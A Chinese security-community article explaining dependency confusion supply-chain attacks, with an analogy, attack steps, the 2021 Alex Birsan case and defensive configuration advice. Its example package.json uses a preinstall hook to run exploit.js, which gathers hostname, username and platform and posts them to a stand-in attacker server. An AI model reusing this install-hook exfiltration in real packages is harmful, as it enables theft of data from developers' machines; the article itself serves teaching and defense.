# 软件层供应链攻击-----依赖混淆攻击-先知社区

### 核心定义：

**依赖混淆攻击**是一种软件供应链攻击。攻击者通过向公共软件包仓库（如 npm、PyPI、Maven Central 等）上传名称与目标公司内部私有依赖包**同名且版本号更高**的恶意软件包，来欺骗目标的构建工具（如 pip、npm、Maven 等），使其错误地下载并安装恶意公共包，而非预期的私有内部包。

简单来说，这是一种“冒名顶替”攻击，利用了包管理器在解析依赖时的默认行为。

### 一个简单的比喻：

想象一下你的公司有一个内部食堂，每天会从“内部供应商A”订餐。

1. **正常情况**： 你打电话给总机说“我要A的午餐”，总机会自动转接到内部供应商A。
2. **依赖混淆攻击**： 攻击者在城市里开了一家同名的“A餐饮公司”，并且宣传自己提供“更新颖”的菜品（相当于更高的版本号）。现在，如果你的总机接线员（包管理器）接到指令“我要最新版的A的午餐”，他可能会先在城市黄页（公共仓库）里查找，发现这个外部的“A公司”版本更新，于是就从那里订了餐。
3. **后果**： 你吃下了来自不明外部供应商的、可能有毒的饭菜（恶意代码）。

### 攻击原理和步骤

这种攻击成功需要两个关键条件：

1. **内部存在私有依赖**： 公司内部开发了一个库，例如名为 @mycompany/awesome-tool，它被存储在公司的私有仓库中。
2. **依赖解析策略存在漏洞**： 项目的包管理器（如 npm、pip）配置为**同时从公共仓库和私有仓库获取包**，并且在发生命名冲突时，**默认优先选择版本号更高的包**，而不管它来自哪个仓库。

攻击步骤如下：

1. **侦察**： 攻击者会想方设法获取目标公司内部依赖包的名称。方法包括：

* 从公开的源码、错误信息、招聘信息中寻找线索。
* 根据常见命名方式猜测（如 companyname-\*, internal-\*, \*-internal）。

2. **制作恶意包**： 攻击者在公共仓库（如 [npmjs.com](https://npmjs.com/)）上注册一个与内部包**完全同名**的包。
3. **设置高版本号**： 为了让恶意包被优先选择，攻击者会将其版本号设置得非常高（例如 99.0.0），远高于内部使用的版本（如 1.5.0）。
4. **嵌入恶意代码**： 在恶意包中嵌入后门、信息窃取程序、挖矿脚本或勒索软件等。
5. **等待上钩**： 当目标公司的开发人员执行 npm install、pip install 等命令时，构建工具会查询所有配置的仓库，寻找名为 @mycompany/awesome-tool 的最新版本。它发现公共仓库上有 99.0.0，而私有仓库上只有 1.5.0。由于默认行为是选择最高版本，构建工具便会从公共仓库下载并安装恶意版本 99.0.0。
6. **执行恶意代码**： 恶意代码在构建过程或应用程序运行时被执行，攻击完成。

## 实例一：Alex Birsan的"白帽"攻击（2021年）

这是最著名的依赖混淆攻击案例，安全研究员Alex Birsan通过此方法成功入侵了35家顶级科技公司的内部系统。

### 攻击手法细节：

**1. 侦察阶段：**

* 从公开的源代码片段、错误日志、文档中收集内部包名
* 利用苹果公司的Bug报告系统，通过错误信息获取内部包名
* 分析LinkedIn等技术招聘信息中提到的内部工具名称

**2. 恶意包制作：**

```
// package.json 示例
{
  "name": "slack-utils", // 模仿Slack内部工具
  "version": "99.0.0",   // 极高的版本号
  "scripts": {
    "preinstall": "node exploit.js" // 安装前执行恶意代码
  }
}
```

**3. 恶意代码内容（exploit.js）：**

```
const https = require('https');
const os = require('os');

// 收集系统信息
const data = JSON.stringify({
  package: process.env.npm_package_name,
  version: process.env.npm_package_version,
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform()
});

// 发送到攻击者控制的服务器
const options = {
  hostname: 'malicious-server.com',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options);
req.write(data);
req.end();
```

**4. 攻击结果：**

* **苹果公司**：在数小时内收到了来自苹果内部网络的呼叫
* **微软**：收到了来自Office 365构建系统的数据
* **特斯拉**：获取了内部制造系统的访问证据
* **PayPal**：收到了来自其支付系统的信息
* **Yelp、Netflix、Uber**等公司也受到影响

**5. 技术要点：**

* 使用了preinstall脚本，在包安装前就执行
* 只收集元数据，不进行破坏性操作（因为是白帽测试）
* 攻击包被下载超过35,000次

### 防御

防御的核心在于：**明确告诉包管理器应该从哪里获取包，并优先信任私有源。**

1. **使用作用域包**： 这是最有效的方法。

* 例如，将内部包命名为 @mycompany/awesome-tool，而不是简单的 awesome-tool。
* 在配置中（如 .npmrc），可以设置 @mycompany 开头的包**始终且仅从**私有仓库获取。

**命令示例 (npm)**：

* bashnpm config set @mycompany:registry https://your-private-registry.com/

2. **正确配置包管理器源优先级**：

* 确保构建系统在解析依赖时，**先查询私有源，再查询公共源**，或者将私有源设置为唯一来源。
* 对于一些包管理器，可以强制使用锁定文件。

3. **使用依赖锁定文件**：

* 始终使用并维护 package-lock.json (npm)、Pipfile.lock (pipenv)、Cargo.lock (Rust) 等文件。
* 这些文件会锁定每个依赖的确切版本和哈希值，防止自动升级到新版本。

4. **在公共仓库上抢占名称**：

* 虽然不能完全防止攻击，但可以作为一种防御措施。将你所有内部包的同名空包或占位包在公共仓库上发布，这样可以防止攻击者使用完全相同的名字。

5. **安全扫描和审计**：

* 使用软件成分分析工具持续扫描代码库和依赖，检查是否存在来自不可信源的包。
* 定期运行 npm audit、snyk test 等命令。
